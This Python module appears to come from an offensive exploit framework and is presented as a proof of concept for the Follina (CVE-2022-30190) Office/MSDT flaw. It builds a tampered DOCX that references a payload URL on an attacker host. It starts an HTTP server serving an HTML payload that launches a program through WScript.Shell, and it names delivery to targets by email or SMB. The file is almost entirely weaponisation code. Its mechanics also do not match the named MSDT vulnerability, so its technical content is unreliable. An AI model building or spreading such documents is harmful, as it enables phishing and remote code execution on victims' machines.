# File: modules/exploit_lib/cve_2022_30190_follina.py

"""
Follina (Microsoft Office MSDT) PoC:
• Constructs a malicious DOCX that triggers MSDT from an external URL.
• Hosts the HTML/HTA payload on built-in HTTP server.
• Sends the DOCX to the target (via SMB share or emailing).
"""

import zipfile
import shutil
import os
import tempfile
import logging
import http.server
import threading
from pathlib import Path
from bismillah import log_event

logger = logging.getLogger("cve_2022_30190")

HTML_PAYLOAD = """
<html>
<head>
  <script>
    var shell = new ActiveXObject("WScript.Shell");
    shell.Run("calc.exe", 0, false);
  </script>
</head>
<body></body>
</html>
"""

def build_docx_template(docx_path: str, external_url: str):
    """
    Unzip a minimal docx, modify 'word/settings.xml' to include <w:ExternalReference ...>
    pointing to the external URL that hosts the malicious HTML payload.
    """
    tmpdir = tempfile.mkdtemp(prefix="follina_")
    try:
        with zipfile.ZipFile(docx_path, 'r') as zin:
            zin.extractall(tmpdir)
        settings_path = os.path.join(tmpdir, "word", "settings.xml")
        if not os.path.exists(settings_path):
            raise FileNotFoundError("settings.xml not found in DOCX template")
        # Insert ExternalReference
        with open(settings_path, "r", encoding="utf-8") as f:
            content = f.read()
        ext_ref = f"""
<w:settings xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"
            xmlns:w15="http://schemas.microsoft.com/office/word/2012/wordml">
  <w15:externalLink>
    <w15:url>{external_url}</w15:url>
  </w15:externalLink>
</w:settings>
"""
        with open(settings_path, "w", encoding="utf-8") as f:
            f.write(ext_ref)
        # Repack DOCX
        new_docx = f"{Path(docx_path).stem}_exploit.docx"
        with zipfile.ZipFile(new_docx, 'w', zipfile.ZIP_DEFLATED) as zout:
            for root, dirs, files in os.walk(tmpdir):
                for file in files:
                    full = os.path.join(root, file)
                    rel = os.path.relpath(full, tmpdir)
                    zout.write(full, rel)
        return new_docx
    finally:
        shutil.rmtree(tmpdir)

def start_payload_http(port: int = 8000):
    """
    Hosts the HTML payload on a simple HTTP server at /payload.html.
    """
    class Handler(http.server.SimpleHTTPRequestHandler):
        def do_GET(self):
            if self.path == "/payload.html":
                self.send_response(200)
                self.send_header("Content-type", "text/html")
                self.end_headers()
                self.wfile.write(HTML_PAYLOAD.encode())
            else:
                self.send_response(404)
                self.end_headers()

    server = http.server.ThreadingHTTPServer(("0.0.0.0", port), Handler)
    logger.info(f"[Follina] Serving payload at http://0.0.0.0:{port}/payload.html")
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return server

def exploit(target: str, port: int = 8000, docx_template: str = None) -> dict:
    """
    1) Starts HTTP payload server on port.
    2) Builds exploit.docx pointing to http://<attacker_ip>:port/payload.html.
    3) Returns path to crafted DOCX; operator must deliver it to target.
    """
    try:
        if not docx_template or not os.path.exists(docx_template):
            raise ValueError("Valid DOCX template path required")
        attacker_ip = os.getenv("ATTACKER_IP", "192.168.1.10")
        external_url = f"http://{attacker_ip}:{port}/payload.html"
        server = start_payload_http(port)
        exploit_docx = build_docx_template(docx_template, external_url)
        log_event("cve_2022_30190_follina", f"Built exploit DOCX: {exploit_docx}".encode())
        return {"status": "ok", "docx": exploit_docx}
    except Exception as e:
        logger.error(f"[Follina] Exploit build failed: {e}")
        return {"status": "error", "detail": str(e)}
